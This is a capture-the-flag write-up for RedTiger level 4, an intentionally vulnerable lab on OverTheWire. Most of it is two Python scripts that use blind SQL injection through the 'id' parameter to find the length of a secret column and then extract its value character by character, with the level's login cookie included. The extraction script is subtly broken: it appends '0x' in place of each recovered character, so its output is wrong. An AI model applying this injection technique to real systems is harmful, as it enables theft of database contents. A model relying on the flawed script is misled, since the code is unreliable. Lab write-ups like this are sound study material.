================================================================================================================
[redtiger] level4
================================================================================================================

.. graphviz::

    digraph G {
        rankdir="LR";
        node[shape="point"];
        edge[arrowhead="none"]

        {
            rank="same";
            "client"[shape="plaintext"];
            "client" -> step0 -> step2 -> step4 -> step6 -> step8;
        }

        {
            rank="same";
            "server"[shape="plaintext"];
            "server" -> step1 -> step3 -> step5 -> step7 -> step9;
        }
        step0 -> step1[label="level4.php?id=1 and if((select length(keyword) from level4_secret)=%s,1,0)",arrowhead="normal"];
        step3 -> step2[label="column length",arrowhead="normal"];
        step4 -> step5[label="level4.php?id=1 and if((select substring(keyword,%s,1) from level4_secret)=%s,1,0)",arrowhead="normal"];
        step7 -> step6[label="@solve",arrowhead="normal"];
    }

|

Source Analysis
================================================================================================================

- Target: Get the value of the first entry in table level4_secret in column keyword
- Disabled: like

.. code-block:: html

    <a href="?id=1">Click me</a>
    Query returned 1 rows.
    <form method="post">
        Word: <input type="text" name="secretword">
        <input type="submit" name="go" value="Go!">
    </form>
    


|

Column Length
================================================================================================================

.. code-block:: python

    import requests

    requests.packages.urllib3.disable_warnings()

    url = "https://redtiger.labs.overthewire.org/level4.php"
    cookies = {
        "level4login":"dont_publish_solutions_GRR%21"
    }

    n = 0
    bef_ret = ''
    for l in range(20):
        params = {
            "id": "1 and if((select length(keyword) from level4_secret)=%s,1,0)" % str(l)
        }
        print "1 and if((select length(keyword) from level4_secret)=%s,1,0)" % str(l)
        r = requests.post(url, cookies=cookies, params=params, verify=False)
        if bef_ret!=r.content:
            print r.content
        bef_ret = r.content



|

Data Extract
================================================================================================================


.. code-block:: python

    import requests

    requests.packages.urllib3.disable_warnings()

    url = "https://redtiger.labs.overthewire.org/level4.php"
    cookies = {
        "level4login":"dont_publish_solutions_GRR%21"
    }

    n = 0
    bef_ret = ''
    ans = ''
    # column length = 17
    for l in range(1,18):
        # character range
        for m in range(31,128):
            params = {
                "id": "1 and if((select substring(keyword,%s,1) from level4_secret)=%s,1,0)" % (str(l),hex(m))
            }
            print "1 and if((select substring(keyword,%s,1) from level4_secret)=%s,1,0)" % (str(l),hex(m))
            r = requests.post(url, cookies=cookies, params=params, verify=False)
            if bef_ret!=r.content and bef_ret!='':
                print r.content
                ans += str(hex(m))[:2]
                break
            bef_ret = r.content

    print ans

